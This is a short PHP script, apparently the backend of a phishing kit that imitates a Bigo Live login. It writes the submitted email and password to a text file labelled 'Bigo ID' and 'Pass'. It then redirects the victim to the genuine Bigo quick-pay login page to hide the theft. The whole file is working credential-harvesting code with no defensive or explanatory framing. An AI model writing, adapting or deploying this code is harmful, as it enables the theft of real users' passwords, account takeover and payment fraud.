<?php
file_put_contents("usernames.txt", "Bigo ID: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://mobile.bigo.tv/live/quicklyPay/quicklyPayIndex.html#/login/');
exit();
?>